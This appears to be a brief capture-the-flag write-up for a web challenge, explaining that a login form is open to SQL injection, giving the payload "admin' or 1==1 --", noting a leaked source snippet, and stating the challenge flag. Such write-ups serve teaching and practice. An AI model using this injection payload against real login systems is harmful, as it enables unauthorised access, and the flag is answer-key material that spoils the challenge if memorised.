## Solution

Style Query Listing -> SQL
Try something simple like 
admin' or 1==1 --

Site throws exception, which can be used to see source code.
```python
if username == 'admin':
    return redirect(url_for('admin'))
```

Go to /admin for the flag.

flag: OSCTF{D1r3ct0RY_BrU7t1nG_4nD_SQL}